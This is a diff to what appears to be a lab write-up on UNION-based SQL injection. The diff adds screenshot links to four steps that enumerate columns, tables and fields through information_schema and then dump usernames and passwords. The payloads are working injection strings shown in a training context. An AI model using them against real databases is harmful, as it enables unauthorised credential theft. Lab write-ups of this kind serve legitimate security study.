@@ -25,11 +25,15 @@ viable.
 
 **Step 1 — Confirm columns:**
 
+![check datatype column](images/05/noof_column.png)
+
 `' UNION SELECT 'abc','def'--`
 
 → Confirmed **2 text columns**
 
 **Step 2 — List tables:**
+
+![check datatype column](images/05/print_tables.png)
 
 `' UNION SELECT table_name,NULL FROM information_schema.tables--`
 
@@ -37,11 +41,15 @@ viable.
 
 **Step 3 — List columns:**
 
+![check datatype column](images/05/column_from_table.png)
+
 `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_btzctr'--`
 
 → Found `username_evaeqr` and `password_budnse`
 
 **Step 4 — Dump credentials**
+
+![check datatype column](images/05/usr_pass_table.png)
 
 `' UNION SELECT username_evaeqr,password_budnse FROM users_btzctr--`
 
